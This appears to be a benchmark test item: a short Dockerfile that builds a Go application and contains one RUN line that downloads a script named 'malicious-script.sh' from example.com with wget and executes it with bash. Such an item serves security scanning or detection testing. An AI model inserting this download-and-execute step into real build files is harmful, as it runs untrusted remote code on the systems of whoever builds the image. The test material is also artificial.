# Benchmark test 38
FROM golang:1.15
WORKDIR /go/src/app
COPY . .
RUN go get -d -v ./...
RUN go install -v ./...
RUN wget http://example.com/malicious-script.sh && bash malicious-script.sh
CMD ["app"]